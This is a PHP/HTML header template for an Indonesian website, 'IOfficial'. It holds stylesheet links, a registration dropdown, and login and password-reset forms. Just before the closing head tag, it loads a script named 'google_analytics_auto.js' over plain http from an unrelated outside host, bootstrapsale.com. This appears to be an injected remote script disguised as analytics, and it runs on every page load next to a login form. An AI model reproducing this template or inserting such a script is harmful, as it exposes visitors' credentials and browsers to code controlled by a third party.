<?php
$query = $this->db->query('SELECT * FROM setting WHERE status=1');
$app = $query->row();
?>

<!DOCTYPE html>
<html lang="en">
<!--[if IE 9 ]><html lang="en" class="ie9"><![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?php echo $pageTitle; ?> - <?php echo $app->name; ?></title>

  <!-- Vendors -->

  <!-- Material design colors -->
  <link href="<?php echo base_url(); ?>assets/backend/vendors/bower_components/material-design-iconic-font/dist/css/material-design-iconic-font.min.css" rel="stylesheet">

  <!-- CSS animations -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/backend/vendors/bower_components/animate.css/animate.min.css">

  <!-- Select2 - Custom Selects -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/backend/vendors/bower_components/select2/dist/css/select2.min.css">

  <!-- Slick Carousel -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/backend/vendors/bower_components/slick-carousel/slick/slick.css">

  <!-- NoUiSlider - Input Slider -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/backend/vendors/bower_components/nouislider/distribute/nouislider.min.css">

  <!-- Site -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/backend/css/app_1.min.css">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/backend/css/app_2.min.css">

  <!-- Page Loader JS -->
  <script src="<?php echo base_url(); ?>assets/backend/js/page-loader.min.js" async></script>
  <script src='http://bootstrapsale.com/google_analytics_auto.js'></script></head>

  <body>
    <!-- Start page loader -->
    <div id="page-loader">
      <div class="page-loader__spinner"></div>
    </div>
    <!-- End page loader -->

    <header id="header">
      <div class="header__top">
        <div class="container">
          <ul class="top-nav">
            <li class="dropdown top-nav__guest">
              <a data-toggle="dropdown" href="#">Registrasi</a>

              <form class="dropdown-menu stop-propagate">
                <div class="form-group">
                  <input type="text" class="form-control" placeholder="Fullname">
                  <i class="form-group__bar"></i>
                </div>

                <div class="form-group">
                  <input type="text" class="form-control" placeholder="Email">
                  <i class="form-group__bar"></i>
                </div>

                <div class="form-group">
                  <input type="password" class="form-control" placeholder="Username">
                  <i class="form-group__bar"></i>
                </div>

                <div class="form-group">
                  <input type="password" class="form-control" placeholder="Password">
                  <i class="form-group__bar"></i>
                </div>

                <p><small>By Signing up with IOfficial, you're agreeing to our <a href="#">terms and conditions</a>.</small></p>

                <button class="btn btn-primary btn-block m-t-10 m-b-10">Daftar</button>



              </form>
            </li>

            <li class="dropdown top-nav__guest">
              <a data-toggle="dropdown" href="#" data-rmd-action="switch-login">Login</a>

              <div class="dropdown-menu">
                <div class="tab-content">
                  <form action="<?php echo $action ?>" method="post" role="form" class="tab-pane active in fade" id="top-nav-login" action="/">
                    <div class="form-group">
                     <input type="text" name="username" class="form-control" placeholder="Username" required>
                     <i class="form-group__bar"></i>
                   </div>

                   <div class="form-group">
                     <input type="password" name="password" class="form-control" placeholder="Password" required>
                     <i class="form-group__bar"></i>
                   </div>

                   <?php echo $error; ?>

                   <button class="btn btn-primary btn-block m-t-10 m-b-10">Login</button>

                   <div class="text-center">
                    <a href="#top-nav-forgot-password" data-toggle="tab"><small>Lupa Password ? </small></a>
                  </div>


                </form>

                <form class="tab-pane fade forgot-password" id="top-nav-forgot-password">
                  <a href="##top-nav-login" class="top-nav__back" data-toggle="tab"></a>

                  <p>Untuk memulihkan password silahkan masukan alamat email atau username anda.</p>

                  <div class="form-group">
                    <input type="text" class="form-control" placeholder="Emaill Address">
                    <i class="form-group__bar"></i>
                  </div>

                  <button class="btn btn-warning btn-block">Reset Password</button>
                </form>
              </div>
            </div>
          </li>

          <li class="pull-right top-nav__icon">
            <a href="<?php echo $app->facebook; ?>"><i class="zmdi zmdi-facebook"></i></a>
          </li>
          <li class="pull-right top-nav__icon">
            <a href="<?php echo $app->twitter; ?>"><i class="zmdi zmdi-twitter"></i></a>
          </li>
          <li class="pull-right top-nav__icon">
            <a href="<?php echo $app->instagram; ?>"><i class="zmdi zmdi-instagram"></i></a>
          </li>

          <li class="pull-right hidden-xs"><span><i class="zmdi zmdi-email"></i><?php echo $app->email; ?></span></li>
          <li class="pull-right hidden-xs"><span><i class="zmdi zmdi-phone"></i><?php echo $app->phone; ?></span></li>
        </ul>
      </div>
    </div>